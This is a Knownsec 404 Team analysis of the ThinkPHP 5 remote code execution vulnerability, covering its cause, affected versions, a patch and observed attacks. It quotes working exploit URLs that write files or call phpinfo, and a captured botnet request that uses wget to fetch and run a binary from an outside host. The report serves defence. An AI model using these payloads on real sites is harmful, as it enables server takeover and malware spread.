**Author: Knownsec 404 Team**  
**Date: December 19, 2018**

### 0x00 Background
On December 10, 2018, ThinkPHP officially released the "Security Update of ThinkPHP 5," which addressed a remote code execution (RCE) vulnerability. This vulnerability arises because the ThinkPHP framework does not adequately validate controller names, allowing attackers to execute arbitrary code.

The Knownsec 404 Team promptly initiated an emergency response and conducted a thorough analysis. After extensive testing and source code review, the affected versions were identified as:
- ThinkPHP 5.0.5-5.0.22
- ThinkPHP 5.1.0-5.1.30

Upon reviewing relevant defense logs, it was discovered that the vulnerability had been first exploited in September 2018, targeting numerous virtual currency and financial websites. Within a week of the vulnerability's disclosure, the Knownsec 404 Team's honeypot project captured several instances of attacks exploiting this vulnerability. It became evident that the vulnerability was integrated into malicious samples by botnets within just 8 days of its exposure, spreading via worm-like mechanisms.

Given the simplicity of triggering the vulnerability and its significant impact, we have documented our findings and released this report after studying the underlying principles.

### 0x01 Vulnerability Analysis

#### 1.1 Cause of Vulnerability
The vulnerability stems from the ThinkPHP5 framework's failure to strictly filter controller names. This allows an attacker to call sensitive functions within the ThinkPHP framework through the URL, leading to a getshell vulnerability. We will use ThinkPHP5.0.22 as an example.

According to the documentation, ThinkPHP5 supports multiple route definitions:
- Route definition 4: Routes requests to specified (and must be public) methods of specified classes.
- Default mode 1: Parses and schedules the URL if no routes are defined.

Let's examine the specific code implementation:
- `thinkphp/library/think/App.php`: If no routes are defined in the configuration file, the schedule is resolved by default in mode 1. If forced routing mode is enabled, an error is thrown.
- `thinkphp/library/think/Route.php`: When parsing the URL, ThinkPHP5 splits the URL by delimiters without performing security checks.
- `thinkphp/library/think/App.php`: The controller name is obtained directly from the parsing result without any security checks.
- `thinkphp/library/think/Loader.php`: The corresponding class is instantiated based on the passed name. If the class exists, an instantiated object is returned.

In the `getModuleAndClass` method, if there is a `\` in the controller name, it returns directly. Under normal circumstances, the instantiated object of the corresponding controller class should be obtained. However, with the vulnerability, an instantiated object of `\think\App` is obtained instead. This allows the attacker to call arbitrary public methods via the URL and pass extra parameters as method arguments.

#### 1.2 Affected Version
During testing, it was found that the payload for version 5.0.5 did not work and reported an error. The issue lies in the `controller` method of `thinkphp/library/think/Loader.php` in ThinkPHP 5.0.5. The weak type handling in PHP prevents the payload from being effective. Removing the first `\` in the payload makes it functional.

Further investigation revealed that versions 5.0.0-5.0.4 do not handle the case of `\` in the controller name, rendering the payload ineffective. Therefore, the affected versions of ThinkPHP 5.0 are **5.0.5-5.0.22**.

#### 1.3 Vulnerability Defense
To mitigate this vulnerability, consider the following steps:
1. Upgrade to the latest version of ThinkPHP: 5.0.23 or 5.0.31.
2. Adopt good development practices, such as using forced routing mode (not recommended for production environments).
3. Apply a direct patch by adding the following code:
   - In `thinkphp/library/think/App.php` line 554 for ThinkPHP 5.0:
     ```php
     if (!preg_match('/^[A-Za-z](\w|\.)*$/', $controller)) {
         throw new HttpException(404, 'Controller not exists: ' . $controller);
     }
     ```
   - In `thinkphp/library/think/route/dispatch/Url.php` line 63 for ThinkPHP 5.1:
     ```php
     if (!preg_match('/^[A-Za-z](\w|\.)*$/', $controller)) {
         throw new HttpException(404, 'Controller not exists: ' . $controller);
     }
     ```

### 0x02 Analysis of Actual Attacks

#### 2.1 0day in the Wild
Our Knownsec 404 Team detected the vulnerability's payload as early as September 3, 2018, through the "Knownsec Cloud WAF." Here are some notable attacks:

- On September 3, 2018, IP 58.49._._ (Wuhan, Hubei) launched an attack using the payload:
  ```
  /?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=1.php&vars[1][]=
  ```
  This payload writes PHP code to a file to verify the vulnerability.

- On October 16, 2018, the same IP attacked another website using the payload:
  ```
  /?s=index/\think\container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
  ```
  This payload calls `phpinfo` directly, simplifying the verification process.

- On October 6, 2018, IP 172.111._._ (Austria) targeted various virtual currency websites with the payload:
  ```
  /index.php/?s=index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=file_put_contents&vars%5B1%5D%5B%5D=readme.txt&vars%5B1%5D%5B%5D=1
  ```

- On December 9, 2018, IP 45.32._._ (United States) attacked multiple investment and financial websites using the payload:
  ```
  /?s=admin/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
  ```

#### 2.2 After the Exposure of 0day
After the official release of the security update, the Knownsec 404 Team successfully reproduced the vulnerability and updated the WAF protection strategy. The number of attacks surged, and the vulnerability was widely exploited. Within eight days of the security update (December 9-17, 2018), a total of **5,570** IPs launched **2,566,78** attacks on **486,962** websites.

Our internal honeypot project began detecting the vulnerability on December 13, probing the following directories:
- `/TP/public/index.php`
- `/TP/index.php`
- `/thinkphp/html/public/index.php`
- `/thinkphp/public/index.php`
- `/html/public/index.php`
- `/public/index.php`
- `/index.php`
- `/TP/html/public/index.php`

The detection parameters used were:
```
?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP
```

By December 18, botnets had integrated the vulnerability exploit into malicious samples and spread them on the internet. Captured attack traffic included:
```
GET /index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars1=wget%20http://cnc.arm7plz.xyz/bins/set.x86%20-O%20/tmp/.eSeAlg;%20chmod%20777%20/tmp/.eSeAlg;%20/tmp/.eSeAlg%20thinkphp HTTP/1.1
```
This sample was spread using CVE-2017-17215, CNVD-2014-01260, and the ThinkPHP5 RCE vulnerability.

### 0x03 Conclusion
This vulnerability exemplifies the typical lifecycle of a 0day vulnerability, from initial exploratory attacks to targeted attacks on virtual currency, investment, and financial websites, and finally to large-scale batch attacks after public exposure. Given the widespread use of ThinkPHP in developing CMS and private websites, the impact of this vulnerability may be more profound than initially observed.

### About Knownsec & 404 Team
Beijing Knownsec Information Technology Co., Ltd. was founded by a group of high-profile international security experts. The company has over a hundred top-tier security talents nationwide, providing advanced network security solutions for governments and enterprises. Knownsec specializes in integrated network attack and defense technologies, product R&D, and visualization solutions that meet world-class security standards. The company's technical strength is recognized by the State Ministry of Public Security, the Central Government Procurement Center, the Ministry of Industry and Information Technology (MIIT), China National Vulnerability Database of Information Security (CNNVD), the Central Bank, the Hong Kong Jockey Club, Microsoft, Zhejiang Satellite TV, and other well-known clients.

The 404 Team, the core security team of Knownsec, focuses on security vulnerability research and offensive and defensive technology in Web, IoT, industrial control, and blockchain fields. The team has submitted vulnerability research to many well-known vendors, including Microsoft, Apple, Adobe, Tencent, Alibaba, and Baidu, earning a high reputation in the industry.

Key initiatives of the Knownsec 404 Team include:
- [KCon Hacking Conference](http://kcon.knownsec.com/#/ "KCon Hacking Conference")
- [Seebug Vulnerability Database](https://www.seebug.org/ "Seebug Vulnerability Database")
- [ZoomEye Cyberspace Search Engine](https://www.zoomeye.org/ "ZoomEye Cyberspace Search Engine")